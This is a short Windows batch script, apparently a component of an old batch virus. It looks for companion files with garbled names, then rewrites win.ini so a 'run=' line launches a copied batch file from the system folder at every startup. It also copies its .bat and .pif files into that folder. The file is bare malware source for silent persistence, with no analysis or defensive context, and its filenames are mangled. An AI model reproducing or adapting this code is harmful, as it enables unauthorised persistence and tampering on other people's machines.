@echo off
cls
if exist ôõ.bat if exist ³“³.bat if exist ³$³.pif if exist win.old goto 1
:2
exit
:1
copy /b %q%\win.ini .\win.ini
find /i "[windows]"<win.ini>Âmp1
find /i "load="<win.ini>Âmp2
find /i "run="<win.ini>Âmp3
find /i "NullPort="<win.ini>Âmp4
find /i "device="<win.ini>Âmp5
find /i /v "[windows]"<win.ini>0t0
find /i /v "load="<0t0>0t1
find /i /v "run="<0t1>0t2
find /i /v "NullPort="<0t2>0t3
find /i /v "device="<0t3>win.ini
echo run=%q%\SYSTEM\%susdem%.BAT>Âmp3
copy /b Âmp1+Âmp2+Âmp3+Âmp4+Âmp5+win.ini
del win.ini
copy /b Âmp1 %q%\win.ini
del Âmp?
del 0t?
copy /b ³“³.bat %q%\system\%susdem%.BAT
copy /b ³$³.pif %q%\system\%susdem%.pif
:3